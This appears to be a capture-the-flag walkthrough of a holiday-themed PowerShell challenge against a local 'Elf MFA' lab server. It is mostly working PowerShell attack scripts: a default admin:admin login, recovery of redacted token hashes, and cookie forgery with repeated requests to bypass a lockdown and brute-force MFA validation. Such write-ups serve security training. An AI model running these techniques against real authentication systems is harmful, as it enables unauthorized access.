
Walk North and click the 'PowerShell' terminal to start the challenge:

> ![](attachments/Pasted%20image%2020241202134831.png)
> 
> ### Silver Medal
> 
> Are you ready to begin? [y]es:

```
y
```

---

> 1\) There is a file in the current directory called 'welcome.txt'. Read the contents of this file

```
gc welcome.txt
```

> ~~~
System Overview
The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.
>
Lockdown Protocols
When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.
>
Access and System Restoration
To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.
> ~~~

---

> 2\) Geez that sounds ominous, I'm sure we can get past the defense mechanisms. 
We should warm up our PowerShell skills. 
How many words are there in the file?

```
gc welcome.txt | measure-object -word
```

> ~~~
> Lines Words Characters Property
> ----- ----- ---------- --------
>         180  
> ~~~

---

> 3\) There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?

```
netstat -ano
```

> ~~~
> Active Internet connections (servers and established)
> Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
> tcp        0      0 127.0.0.1:1225          0.0.0.0:*               LISTEN      off (0.00/0/0)
> tcp6       0      0 172.17.0.4:57900        52.179.73.52:443        ESTABLISHED off (0.00/0/0)
> Active UNIX domain sockets (servers and established)
> Proto RefCnt Flags       Type       State         I-Node   Path
> unix  2      [ ACC ]     STREAM     LISTENING     138599640 /tmp/tmux-1050/default
> unix  2      [ ACC ]     STREAM     LISTENING     138611844 /tmp/dotnet-diagnostic-173-7706180-socket
> unix  2      [ ACC ]     STREAM     LISTENING     138610050 /tmp/CoreFxPipe_PSHost.DB3C1154.173.None.pwsh
> unix  3      [ ]         STREAM     CONNECTED     138599939 
> unix  3      [ ]         STREAM     CONNECTED     138599940 /tmp/tmux-1050/default
> ~~~

---

> 4\) You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?

```
invoke-webrequest 127.0.0.1:1225
```

> ~~~
Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).
> ~~~

---

> 5\) It looks like defensive measures are in place, it is protected by basic authentication. 
Try authenticating with a standard admin username and password.

```
iwr '127.0.0.1:1225' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin")) }
```

> ~~~
> StatusCode        : 200
> StatusDescription : OK
> Content           : \<html>
>                     \<body>
>                     \<pre>
>                     ----------------------------------------------------
>                     🪖 Elf MFA webserver🪖
>                     ⚔️ Grab your tokens for access to weaponry ⚔️
>                     ⚔️ Warning! Sensitive information on the server, protect a…
> RawContent        : HTTP/1.1 200 OK
>                     Server: Werkzeug/3.0.6
>                     Server: Python/3.10.12
>                     Date: Thu, 21 Nov 2024 12:45:15 GMT
>                     Connection: close
>                     Content-Type: text/html; charset=utf-8
>                     Content-Length: 3475
>                     
>                     \<html>
>                     \<body>
>                     \<pre>
> Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.S
>                     tring[]], [Content-Type, System.String[]]…}
> Images            : {}
> InputFields       : {}
> Links             : {@{outerHTML=<a href="http://localhost:1225/endpoints/1">Endpoint 1</a>; t
>                     agName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=<a href="ht
>                     tp://localhost:1225/endpoints/2">Endpoint 2</a>; tagName=A; href=http://lo
>                     calhost:1225/endpoints/2}, @{outerHTML=<a href="http://localhost:1225/endp
>                     oints/3">Endpoint 3</a>; tagName=A; href=http://localhost:1225/endpoints/3
>                     }, @{outerHTML=<a href="http://localhost:1225/endpoints/4">Endpoint 4</a>;
>                      tagName=A; href=http://localhost:1225/endpoints/4}…}
> RawContentLength  : 3475
> RelationLink      : {}
>~~~

---

> 6\) There are too many endpoints here. 
Use a loop to download the contents of each page. What page has 138 words? 
When you find it, communicate with the URL and print the contents to the terminal.

```
$i = 0;while ($i -lt 50) { Write-Host "Trying $i"; Start-Sleep -Seconds 0.3; $i++; if (((iwr http://localhost:1225/endpoints/$i).Content|measure-object -word).Words -eq 138) {echo "Found the endpoint: http://localhost:1225/endpoints/$i"; $i = 999}}
```

> ~~~
> Trying 0    
> Trying 1    
> Trying 2    
> Trying 3    
> Trying 4    
> Trying 5    
> Trying 6    
> Trying 7    
> Trying 8    
> Trying 9    
> Trying 10   
> Trying 11   
> Trying 12   
> Found the endpoint: http://localhost:1225/endpoints/13
> ~~~

```
(iwr http://localhost:1225/endpoints/13).Content
```

> ~~~
> `<html><head><title>MFA token scrambler</title></head><body><p>Yuletide cheer fills the air,<br>    A season of love, of care.<br>    The world is bright, full of light,<br>    As we celebrate this special night.<br>    The tree is trimmed, the stockings hung,<br>    Carols are sung, bells are rung.<br>    Families gather, friends unite,<br>    In the glow of the fire’s light.<br>    The air is filled with joy and peace,<br>    As worries and cares find release.<br>    Yuletide cheer, a gift so dear,<br>    Brings warmth and love to all near.<br>    May we carry it in our hearts,<br>    As the season ends, as it starts.<br>    Yuletide cheer, a time to share,<br>    The love, the joy, the care.<br>    May it guide us through the year,<br>    In every laugh, in every tear.<br>    Yuletide cheer, a beacon bright,<br>    Guides us through the winter night </p><p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p></body></html>
> ~~~

---

> 7\) There seems to be a csv file in the comments of that page. 
 That could be valuable, read the contents of that csv-file!

```
(iwr 'http://127.0.0.1:1225/token_overview.csv' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin")) }).Content
```

> ~~~
> file_MD5hash,Sha256(file_MD5hash)
> 04886164e5140175bafe599b7f1cacc8,REDACTED
> 664f52463ef97bcd1729d6de1028e41e,REDACTED
> 3e03cd0f3d335c6fb50122553f63ef78,REDACTED
> f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
> 32b9401a6d972f8c1a98de145629ea9d,REDACTED
> 3a79238df0a92ab0afa44a85f914fc3b,REDACTED
> 49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
> f8142c1304efb9b7e9a7f57363c2d286,REDACTED
> 706457f6dd78729a8bed5bae1efaeb50,REDACTED
> bb0564aa5785045937a35a9fa3fbbc73,REDACTED
> 4173a7bc22aee35c5fc48261b041d064,REDACTED
> 198b8bf2cd30a7c7fed464cca1720a88,REDACTED
> 3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
> 288e60e318d9ad7d70d743a614442ffc,REDACTED
> 87ab4cb29649807fdb716ac85cf560ea,REDACTED
> 89f3ec1275407c9526a645602d56e799,REDACTED
> 33539252b40b5c244b09aee8a57adbc9,REDACTED
> 152899789a191d9e9150a1e3a5513b7f,REDACTED
> 7cd48566f118a02f300cdfa75dee7863,REDACTED
> d798a55fca64118cea2df3c120f67569,REDACTED
> 6ef5570cd43a3ec9f43c57f662201e55,REDACTED
> bf189d47c3175ada98af398669e3cac3,REDACTED
> 743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
> 270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
> 8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
> 6fd00cbda10079b1d55283a88680d075,REDACTED
> 612001dd92369a7750c763963bc327f0,REDACTED
> 010f2cc580f74521c86215b7374eead6,REDACTED
> 29860c67296d808bc6506175a8cbb422,REDACTED
> 7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
> 45ffb41c4e458d08a8b08beeec2b4652,REDACTED
> d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
> bd7efda0cb3c6d15dd896755003c635c,REDACTED
> 5be8911ced448dbb6f0bd5a24cc36935,REDACTED
> 1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
> 0f262d0003bd696550744fd43cd5b520,REDACTED
> 8cac896f624576d825564bb30c7250eb,REDACTED
> 8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
> b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
> 38bdd7748a70529e9beb04b95c09195d,REDACTED
> 8d4366f08c013f5c0c587b8508b48b15,REDACTED
> 67566692ca644ddf9c1344415972fba8,REDACTED
> 8fbf4152f89b7e309e89b9f7080c7230,REDACTED
> 936f4db24a290032c954073b3913f444,REDACTED
> c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
> cb722d0b55805cd6feffc22a9f68177d,REDACTED
> 724d494386f8ef9141da991926b14f9b,REDACTED
> 67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
> 5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
> # [*] SYSTEMLOG
> # [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
> # [-] ERROR, memory corruption, not all endpoints have been REDACTED
> # [*] Verification endpoint still active
> # [*] http://127.0.0.1:1225/tokens/<sha256sum>
> # [*] Contact system administrator to unlock panic mode
> # [*] Site functionality at minimum to keep weapons active
> ~~~

---

> 8\) Luckily the defense mechanisms were faulty! 
There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!

```
iwr 'http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))};
```

> ~~~
> StatusCode        : 200
> StatusDescription : OK
> Content           : \<h1>[!] ERROR: Missing Cookie 'token'\</h1>
> RawContent        : HTTP/1.1 200 OK
>                     Server: Werkzeug/3.0.6
>                     Server: Python/3.10.12
>                     Date: Mon, 02 Dec 2024 04:05:35 GMT
>                     Connection: close
>                     Content-Type: text/html; charset=utf-8
>                     Content-Length: 42
>                     
>                     \<h1>[!] ERROR: Missing Co…
> Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.S
>                     tring[]], [Content-Type, System.String[]]…}
> Images            : {}
> InputFields       : {}
> Links             : {}
> RawContentLength  : 42
> RelationLink      : {}
> ~~~

---

> 9\) It looks like it requires a cookie token, set the cookie and try again.

```
$session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$cookie = [System.Net.Cookie]::new('token','5f8dd236f862f4507835b0e418907ffc');
$session.Cookies.Add('http://127.0.0.1/',$cookie);
(Invoke-WebRequest -WebSession $session 'http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))}).Content;
```

> ~~~
> \<h1>Cookie 'mfa_code', use it at \<a href='1733115957.1711812'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C\</a>\</h1>
> ~~~

> [!NOTE] Wait...

> ![](attachments/troll_radar%201.gif)
> 
> There is no cookie 'mfa_code'. Instead, there exists a cookie 'mfa_token' that should be set to the value of the mfa code given - which in this case is '1733115957.1711812'

---

> 10\) Sweet we got a MFA token! We might be able to get access to the system.
 Validate that token at the endpoint!

```
$response = (Invoke-WebRequest -WebSession $session 'http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))}).Content
$token = ($response | Select-String -Pattern '([0-9.]{16,})').Matches.Value;
$cookie = [System.Net.Cookie]::new('mfa_token',$token);
$session.Cookies.Add('http://127.0.0.1/',$cookie);
$response = Invoke-WebRequest -WebSession $session 'http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))};
$response.Content
```

> ~~~
> \<h1>[+] Success\</h1>\<br>\<p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==\</p>
> ~~~

---

> 11\) That looks like base64! Decode it so we can get the final secret!

```
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="))
```

> ~~~
Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
> ~~~
> 
> This completes the Silver challenge.
 
---

> ### Gold Medal
> 
> ![](attachments/Pasted%20image%2020241202142651.png)
> 
> ![](attachments/Pasted%20image%2020241202142635.png)

In the 'PowerShell' terminal, run the following command to download 'token_overview.csv':

```
(iwr 'http://127.0.0.1:1225/token_overview.csv' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin")) }).Content | Out-File output.txt
```

> The file is quite large and will overflow on the terminal - you could use TMux command CTRL + B, followed by pressing the 'Page Up' key, but we can also grab the file in parts:

```
gc -first 25 output.txt
```

> ~~~
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
> ~~~

```
gc -first 50 output.txt | Select-Object -Skip 25
```

> ~~~
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
> ~~~

```
gc -first 75 output.txt | Select-Object -Skip 50
```

> ~~~
> # [*] SYSTEMLOG
> # [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
> # [-] ERROR, memory corruption, not all endpoints have been REDACTED
> # [*] Verification endpoint still active
> # [*] http://127.0.0.1:1225/tokens/<sha256sum>
> # [*] Contact system administrator to unlock panic mode
> # [*] Site functionality at minimum to keep weapons active
> ~~~
>
> We reverse engineer the hash settings used, and conclude that the data was encoded in UTF8, without Byte Order Mark (BOM), and terminated with a line feed character (0x0A).

Run the following PowerShell command in the terminal:

```
Function unredact {
  param($string)
  $endline = [byte[]]@(0x0A)
  $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string)
  $utf = $stringBytes + $endline
  $mystream = [IO.MemoryStream]::new([byte[]][char[]]$utf)
  Get-FileHash -InputStream $mystream -Algorithm SHA256
}
unredact '5f8dd236f862f4507835b0e418907ffc'
```

> The script returns the same SHA256 value as the one contained in 'token_overview.csv'. This confirms that our PowerShell script works. We can now hash all other values and restore the SHA256 values of all endpoints.
> 
> CyberChef recipe to get the hashes:
> ~~~
> Find_/_Replace({'option':'Regex','string':'(.)$'},'$1\\n',true,false,true,false)
SHA2('256',64,160)
> ~~~

Run the following PowerShell script in the terminal to decode all endpoints:

```
Function unredact {
  param($string);
  $endline = [byte[]]@(0x0A);
  $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string);
  $utf = $stringBytes + $endline;
  $mystream = [IO.MemoryStream]::new([byte[]][char[]]$utf);
  Get-FileHash -InputStream $mystream -Algorithm SHA256;
}
$unredacted_endpoints = @();
foreach($line in gc output.txt) {
  $md5 = ($line | Select-String -Pattern '([0-9a-fA-F]{32})').Matches.Value;
  if ($md5 -ne $null)
  {
    $sha256 = (unredact $md5).Hash;
    $unredacted_endpoints += @{md5=$md5;sha256=$sha256};
  }
}
echo $unredacted_endpoints

```

Run the following PowerShell script in the terminal to test the first endpoint:

```
$md5 = "04886164e5140175bafe599b7f1cacc8"
$sha256 = "DFD05F3B46D21BC8556CDBF544325A945ED0304EC0BB7DBFD68ED5931E7FF6EE"
$session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
$cookie = [System.Net.Cookie]::new('token',$md5);
$session.Cookies.Add('http://127.0.0.1/',$cookie);
$response = (Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/tokens/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))}).Content
$token = ($response | Select-String -Pattern '([0-9.]{16,})').Matches.Value;
$cookie = [System.Net.Cookie]::new('mfa_token',$token);
$session.Cookies.Add('http://127.0.0.1/',$cookie);
$response = Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/mfa_validate/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))};
$shared_cookie = $response.Headers.'Set-Cookie';
"$md5 : $shared_cookie"
$response

```

> We get a valid 200 StatusCode:
> 
> ~~~
> StatusCode        : 200
> StatusDescription : OK
> Content           : \<h1>[*] Setting cookie attempts\</h1>
> RawContent        : HTTP/1.1 200 OK
>                     Server: Werkzeug/3.0.6
>                     Server: Python/3.10.12
>                     Date: Mon, 02 Dec 2024 04:51:10 GMT
>                     Set-Cookie: attempts=c25ha2VvaWwK01; Path=/
>                     Connection: close
>                     Content-Type: text/html; charset=utf-8
>                     C…
> Headers           : {[Server, System.String[]], [Date, System.String[]], [Set-Cookie, System.S
>                     tring[]], [Connection, System.String[]]…}
> Images            : {}
> InputFields       : {}
> Links             : {}
> RawContentLength  : 36
> RelationLink      : {}
> ~~~

Run the following script, which downloads 'token_overview.csv', unredacts the endpoints, and connects to each of the endpoints once, and finally saves the output in a file 'results.txt':

```
(iwr 'http://127.0.0.1:1225/token_overview.csv' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin")) }).Content | Out-File output.txt

Function unredact {
  param($string);
  $endline = [byte[]]@(0x0A);
  $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string);
  $utf = $stringBytes + $endline;
  $mystream = [IO.MemoryStream]::new([byte[]][char[]]$utf);
  Get-FileHash -InputStream $mystream -Algorithm SHA256;
}
$unredacted_endpoints = @();
foreach($line in gc output.txt) {
  $md5 = ($line | Select-String -Pattern '([0-9a-fA-F]{32})').Matches.Value;
  if ($md5 -ne $null)
  {
    $sha256 = (unredact $md5).Hash;
    $unredacted_endpoints += @{md5=$md5;sha256=$sha256};
  }
}
echo $unredacted_endpoints

Function connect {
  param($params)

  $md5 = $params[0]
  $sha256 = $params[1]

  $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
  $cookie = [System.Net.Cookie]::new('token',$md5);
  $session.Cookies.Add('http://127.0.0.1/',$cookie);
  $ProgressPreference = 'SilentlyContinue';
  $response = (Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/tokens/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))}).Content
  $token = ($response | Select-String -Pattern '([0-9.]{16,})').Matches.Value;
  $cookie = [System.Net.Cookie]::new('mfa_token',$token);
  $session.Cookies.Add('http://127.0.0.1/',$cookie);
  $ProgressPreference = 'SilentlyContinue';
  $response = Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/mfa_validate/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))};
  "$md5 : $response"
  return $response
}

# connect @("5f8dd236f862f4507835b0e418907ffc","4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C")

# connect to all endpoints
$unredacted_endpoints | %{ connect @($_.md5,$_.sha256) } | out-file results.txt
gc results.txt

```

> The file 'welcome.txt' explains the steps we need to perform to complete the challenge:
>
> ~~~
Access and System Restoration
To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.
> ~~~
> 
> Our plan is as follows:
>
> 1\) Trigger the Tripwire Canary defenses by supplying a bogus 'attempts' cookie
> 2\) After the tripwire is triggered, read the mfa code received
> 3\) Change the 'attempts' cookie to the shared cookie value 'c25ha2VvaWwK01'
> 4\) Make legitimate requests to the /mfa_validate endpoints.
> 5\) Send at least 10 requests per endpoint within 2 seconds
> 6\) Since the endpoints were scrambled, we try all endpoints

Run the following PowerShell script to execute the steps above:

```
# Grab the list of tokens
(iwr 'http://127.0.0.1:1225/token_overview.csv' -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin")) }).Content | Out-File output.txt

# Undo redacting of the SHA256 hashes
Function unredact {
  param($string);
  $endline = [byte[]]@(0x0A);
  $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string);
  $utf = $stringBytes + $endline;
  $mystream = [IO.MemoryStream]::new([byte[]][char[]]$utf);
  Get-FileHash -InputStream $mystream -Algorithm SHA256;
}
$unredacted_endpoints = @();
foreach($line in gc output.txt) {
  $md5 = ($line | Select-String -Pattern '([0-9a-fA-F]{32})').Matches.Value;
  if ($md5 -ne $null)
  {
    $sha256 = (unredact $md5).Hash;
    $unredacted_endpoints += @{md5=$md5;sha256=$sha256};
  }
}

# The meat of the burger
Function brute {
  param($params)

  $md5 = $params[0]
  $sha256 = $params[1]

  $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
  $cookie = [System.Net.Cookie]::new('token',$md5);
  $session.Cookies.Add('http://127.0.0.1/',$cookie);

  # trigger Canary TRIPWIRE
  $cookie = [System.Net.Cookie]::new('attempts','c25ha2VvaWw');
  $session.Cookies.Add('http://127.0.0.1/',$cookie);
  $ProgressPreference = 'SilentlyContinue';
  $response = try {(Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/tokens/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))}).Content} catch {}
  echo $response

  # save mfa_code
  $mfa_code = ($response | Select-String -Pattern '([0-9.]{16,})').Matches.Value;
  Write-Host "mfa_code: $mfa_code"

  # restore shared_cookie
  $cookie = [System.Net.Cookie]::new('attempts','c25ha2VvaWwK01');
  $session.Cookies.Add('http://127.0.0.1/',$cookie);

  # add valid mfa_token cookie with value mfa_code
  $cookie = [System.Net.Cookie]::new('mfa_token',$mfa_code);
  $session.Cookies.Add('http://127.0.0.1/',$cookie);

  # defeat fakeout protocol by connecting 12 times to each /mfa_validate endpoint
  for ($i=0; $i -lt 12; $i++) {
    $ProgressPreference = 'SilentlyContinue';
    $response = try {Invoke-WebRequest -WebSession $session "http://127.0.0.1:1225/mfa_validate/$sha256" -Headers @{ Authorization = "Basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("admin:admin"))};} catch {}
    Write-Host "/mfa_validate: $response"
  }
}

# bruteforce every endpoint
$unredacted_endpoints | %{ brute @($_.md5,$_.sha256) }
```

> The brute-force attack worked, and we see success messages
>
> ![](attachments/Pasted%20image%2020241202150313.png)
> 
> This completes the Gold challenge
> 
> Medal progress:
> 
> ![](attachments/Pasted%20image%2020241202150418.png)